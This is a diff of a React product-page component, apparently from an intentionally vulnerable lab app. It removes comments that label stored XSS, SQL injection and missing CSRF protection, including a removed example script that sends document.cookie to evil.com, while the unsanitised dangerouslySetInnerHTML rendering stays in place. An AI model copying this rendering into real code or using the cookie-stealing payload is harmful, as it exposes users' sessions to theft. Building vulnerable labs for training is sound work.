@@ -3,12 +3,6 @@ import { useParams, Link } from 'react-router-dom';
 import { useAuth } from '../context/AuthContext';
 import axios from 'axios';
 
-/**
- * VULN NOTES:
- * - Reviews rendered via dangerouslySetInnerHTML → Stored XSS
- * - SQLi possible via product ID in URL
- * - No CSRF on review submission
- */
 export default function ProductDetail() {
   const { id } = useParams();
   const { user, token } = useAuth();
@@ -39,13 +33,12 @@ export default function ProductDetail() {
       await axios.post('/api/reviews', {
         product_id: id,
         rating: reviewForm.rating,
-        comment: reviewForm.comment,  // VULN: Raw HTML sent to server
+        comment: reviewForm.comment,  
       }, { headers: { Authorization: `Bearer ${token}` } });
 
       setMsg('Review submitted!');
       setReviewForm({ rating: 5, comment: '' });
 
-      // Refresh reviews
       const { data } = await axios.get(`/api/reviews/${id}`);
       setReviews(data);
     } catch (err) {
@@ -58,7 +51,7 @@ export default function ProductDetail() {
 
   return (
     <div>
-      {/* ── Product Info ────────────────────────────── */}
+      { }
       <div className="product-detail">
         <div className="product-image">
           {product.image && product.image !== '/uploads/default-product.png' ? (
@@ -84,7 +77,7 @@ export default function ProductDetail() {
         </div>
       </div>
 
-      {/* ── Reviews ─────────────────────────────────── */}
+      { }
       <div className="reviews-section">
         <h2>Reviews ({reviews.length})</h2>
 
@@ -100,12 +93,7 @@ export default function ProductDetail() {
               </span>
             </div>
 
-            {/*
-              VULN: Stored XSS – review comment rendered as raw HTML.
-              An attacker can submit:
-                <img src=x onerror="alert(document.cookie)">
-                <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
-            */}
+            { }
             <div
               className="review-body"
               dangerouslySetInnerHTML={{ __html: r.comment }}
@@ -113,7 +101,7 @@ export default function ProductDetail() {
           </div>
         ))}
 
-        {/* ── Review Form ───────────────────────────── */}
+        { }
         {user ? (
           <div className="form-container" style={{ maxWidth: '100%', marginTop: '1.5rem' }}>
             <h2 style={{ fontSize: '1.2rem' }}>Write a Review</h2>
